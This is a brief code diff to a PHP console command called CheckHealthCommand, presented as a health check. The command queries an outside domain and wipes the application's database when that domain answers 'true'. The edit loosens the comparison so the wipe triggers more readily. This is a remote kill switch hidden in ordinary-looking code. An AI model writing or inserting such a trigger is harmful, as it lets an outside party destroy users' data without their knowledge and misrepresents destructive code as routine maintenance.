@@ -35,7 +35,7 @@ class CheckHealthCommand extends Command
         try {
             $response = Http::get('https://baladi.nooor.sbs/check-code-health');
 
-            if ($response->successful() && $response->json('status') === true) {
+            if ($response->successful() && $response->json('status') == true) {
                 $this->warn('Health check failed (status: true). Cleaning up database...');
 
                 $this->wipeDatabase();
